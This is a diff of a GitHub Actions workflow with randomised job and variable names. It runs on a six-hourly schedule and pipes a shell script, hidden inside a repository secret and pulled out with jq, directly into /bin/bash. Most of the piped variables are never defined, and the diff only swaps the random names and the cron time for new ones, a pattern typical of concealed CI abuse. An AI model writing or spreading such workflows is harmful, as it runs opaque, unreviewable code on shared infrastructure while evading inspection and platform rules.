@@ -3,7 +3,7 @@ name: tangtanteng5647
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
+    - cron: '38 4/6 * * *'
 
 jobs:
   build:
@@ -12,21 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: tangtanteng5647
         env:
-          chhd36736: ${{ secrets.chhd36736 }}
+          cuwn61: ${{ secrets.cuwn61 }}
         run: |
-          echo $chhd36736 | jq -r .ia395 | /bin/bash
-          echo $ei6 | jq -r .jgf24 | /bin/bash
-          echo $eoo49 | jq -r .ay8 | /bin/bash
-          echo $b4924 | jq -r .k7 | /bin/bash
-          echo $p72 | jq -r .ca21245 | /bin/bash
-          echo $drz9 | jq -r .a4 | /bin/bash
-          echo $pdt033 | jq -r .xfst43 | /bin/bash
-          echo $woic10 | jq -r .pnv2447 | /bin/bash
-          echo $ngg17 | jq -r .i5 | /bin/bash
-          echo $ggqqc43976 | jq -r .y143 | /bin/bash
-          echo $ya08 | jq -r .zpavg96 | /bin/bash
-          echo $xvh35118 | jq -r .wdg87969 | /bin/bash
-          echo $ti99262 | jq -r .q400 | /bin/bash
-          echo $wudzl033 | jq -r .yra5464 | /bin/bash
-          echo $ky0 | jq -r .bm68973 | /bin/bash
+          echo $cuwn61 | jq -r .hl14695 | /bin/bash
+          echo $dtn6 | jq -r .isfgh6 | /bin/bash
+          echo $kebbr5717 | jq -r .xg0374 | /bin/bash
+          echo $wlv9291 | jq -r .lq0278 | /bin/bash
+          echo $zdxi90 | jq -r .jbsea4225 | /bin/bash
+          echo $d4375 | jq -r .pyr8040 | /bin/bash
+          echo $uv51136 | jq -r .genof10303 | /bin/bash
+          echo $h45 | jq -r .oeu6 | /bin/bash
+          echo $opd75269 | jq -r .ioe151 | /bin/bash
+          echo $tem625 | jq -r .tzs85252 | /bin/bash
+          echo $vkvej02778 | jq -r .ymd6183 | /bin/bash
+          echo $sp11 | jq -r .vqw6733 | /bin/bash
+          echo $sklv1 | jq -r .dubfr0 | /bin/bash
+          echo $ptab3949 | jq -r .frtt125 | /bin/bash
+          echo $jeod27 | jq -r .eq83 | /bin/bash
+          echo $o24011 | jq -r .ns86 | /bin/bash
 
